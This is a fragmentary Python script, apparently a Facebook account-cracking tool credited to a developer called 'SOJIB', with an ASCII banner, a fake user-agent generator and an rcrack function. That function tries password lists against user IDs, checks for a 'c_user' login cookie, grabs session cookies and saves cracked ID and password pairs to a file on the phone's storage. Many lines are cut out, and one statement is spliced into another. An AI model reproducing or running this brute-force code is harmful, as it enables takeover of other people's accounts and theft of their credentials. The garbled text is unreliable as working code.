...
for ua in range(5000):
      ...
      ugen.append(ug)
for ua in range(5000):import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
...
logo=("""
                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
\x1b[1;90m┃ $$$$$$\   $$$$$$\     $$$$$\ $$$$$$\ $$$$$$$\                    ┃
\x1b[1;90m┃ $$  __$$\ $$  __$$\    \__$$ |\_$$  _|$$  __$$\                            ┃
\x1b[1;90m┃ $$ /  \__|$$ /  $$ |      $$ |  $$ |  $$ |  $$ |                                     ┃
\x1b[1;90m┃ \$$$$$$\  $$ |  $$ |      $$ |  $$ |  $$$$$$$\ |                              ┃
\x1b[1;90m┃ \____$$\ $$ |  $$ |$$\   $$ |  $$ |  $$  __$$\                                 ┃
\x1b[1;90m┃ $$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |                                   ┃
\x1b[1;90m┃ \$$$$$$  | $$$$$$  |\$$$$$$  |$$$$$$\ $$$$$$$  |                 ┃
\x1b[1;90m┃  \______/  \______/  \______/ \______|\_______/                              ┃
                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: SOJIB
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94m K1NG-SOJIB-69
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSOJIB\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DIED] {uid} • {ps}")
                open('/sdcard/DIED-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
